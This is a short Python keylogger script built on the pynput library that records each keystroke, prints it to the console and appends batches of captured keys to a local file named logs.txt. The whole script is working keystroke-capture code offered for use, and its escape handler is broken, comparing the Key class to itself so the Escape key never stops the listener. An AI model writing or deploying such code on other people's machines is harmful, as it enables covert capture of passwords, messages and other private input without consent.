# from pynput library
import pynput
from pynput.keyboard import Key, Listener

# global scope declaration of variables
count = 0
keys =[]

# gets called when user gets to press any key on keyboard
def on_press(key):
    global keys, count
    
    keys.append(key)
    count +=1
    
    print("{0} pressed".format(key))
    
    if count > 10:
        count = 0
        write_logger_file(keys)
        keys = []

# gets called for @ log save
def write_logger_file(keys):
    with open('logs.txt', 'a') as file:
        for key in keys:
            
            #edit keys for neat saving
            keys_to_replace = str(key).replace("'", "")
            
            if keys_to_replace.find("space") > 0:
                file.write("\n")
            elif keys_to_replace.find("Key") == -1:
                file.write(str(key))
                
# gets called when user releases a key 
def on_release(key):
    if Key == Key.esc:
        return False

# calling on_press and on_release functions, taking care of key onpress and on release
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
    




